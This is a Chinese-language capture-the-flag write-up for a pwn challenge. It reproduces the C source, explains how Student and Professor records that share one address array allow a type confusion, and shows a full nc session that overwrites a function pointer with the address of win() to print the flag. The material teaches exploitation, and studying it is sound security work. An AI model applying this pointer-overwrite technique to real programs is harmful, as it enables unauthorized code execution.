本题直接给了源码，看看怎么回事
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define FLAG_BUFFER 128
#define NAME_SIZE 128
#define MAX_ADDRESSES 1000

int ADRESSES_TAKEN=0;
void *ADDRESSES[MAX_ADDRESSES];

void win() {
    char buf[FLAG_BUFFER];
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    puts(buf);
    fflush(stdout);
}

struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};

void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score;
    printf("Score Given: %d \n", score);

}

void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];//名字相同就返回
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void* retrieveStudent(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];//名字相同，就返回学生地址
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void readLine(char * buff){
    int lastRead = read(STDIN_FILENO, buff, NAME_SIZE-1);
    if (lastRead<=1){
        exit(0);
        puts("could not read... see you!");
    }
    buff[lastRead-1]=0;
}

int main (int argc, char **argv)
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
        ADDRESSES[ADRESSES_TAKEN]=student;
        readLine(student->name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;
        readLine(professor->name);
        student->scoreProfessor=&giveScoreToProfessor;
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);//student指针改变
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor);//professor指针改变
        puts(professor->name);
        unsigned int value;
	    printf("Input the score: \n");
	    scanf("%u", &value);
        student->scoreProfessor(professor, value); //用地址调用函数givescore      
    }                                               //漏洞是在ADRESSES中没有区分student和professor的地址，导致用教授的score无意间修改student的函数指针，导致win的调用
    return 0;
}
```
耐心点，逐行读一下

发现教授和学生结构体好像
```c
struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);//函数指针
};
```

注意看这两行代码
```c
ADDRESSES[ADRESSES_TAKEN]=student;
//......
ADDRESSES[ADRESSES_TAKEN+1]=professor;
```
`ADDRESSES` 数组中元素并没有区分地址是 `Student` 还是 `Professor` 的，这个我们一个hint

`void* retrieveStudent(char * name )` `void* retrieveProfessor(char * name )` 这两个函数也很像，用来查找 `ADDRESSES` 数组中有无对应学生或老师名，有则返回**第一个出现相同名称的**结构体地址

也就是说，如果学生老师重名，那么这一行 `professor=(struct Professor*) retrieveProfessor(nameProfessor);` 将返回的学生的地址!

那么思路来了：第一次循环，我们可以使老师和学生重名，通过最后一行 `scoreProfessor` 修改该学生结构体的函数指针： `void (*scoreProfessor)(struct Professor*, int);` 到 `win()` 函数地址；第二次选择第一次被修改的学生去打分，这样在循环最后一行就调用了被修改过的函数指针，即：
```c
student->scoreProfessor(professor, value);//--->原来是giveScoreToProfessor的地址
/*---------------------------------------*/
student->scoreProfessor(professor, value);//--->现在是win的地址
```

现在只需要知道 `win()` 的地址就可以了，自行ida一下即得

下面是完整输入例子

```sh
┌──(kali㉿helloeveryone)-[~/ctf/pwn/q19_pointy]
└─$ nc 124.16.75.117 51001
Input the name of a student
aaa
Input the name of the favorite professor of a student
aaa
Input the name of the student that will give the score
aaa
Input the name of the professor that will be scored
aaa
aaa
Input the score:
134517494 //没开随机化，这是win的地址
Score Given: 134517494
Input the name of a student
bbb
Input the name of the favorite professor of a student
bbb
Input the name of the student that will give the score
aaa
Input the name of the professor that will be scored
aaa
aaa
Input the score:
1
NeSE{..............}//略

Input the name of a student

```
